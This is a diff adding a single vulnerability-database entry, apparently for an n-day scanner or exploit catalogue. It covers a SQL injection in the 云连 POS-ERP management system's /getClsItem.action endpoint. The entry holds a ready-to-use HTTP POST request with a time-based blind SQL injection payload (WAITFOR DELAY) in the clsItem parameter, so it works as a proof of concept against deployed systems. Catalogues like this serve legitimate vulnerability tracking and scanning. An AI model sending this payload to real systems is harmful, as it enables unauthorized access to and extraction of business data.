@@ -1,0 +1,13 @@
+vendor = "云连"
+name = "云连 POS-ERP 管理系统 getClsItem.action SQL注入漏洞"
+type = "SQL注入"
+path = "/getClsItem.action"
+version = ""
+detail = """POST /getClsItem.action HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
+
+clsItem=1' WAITFOR DELAY '0:0:5'--"""
+fix = "升级至最新版本"
+date = 20260501
+label = "nday"
+cve = "TVD-2026-11167"
+verifier = "AdySec"
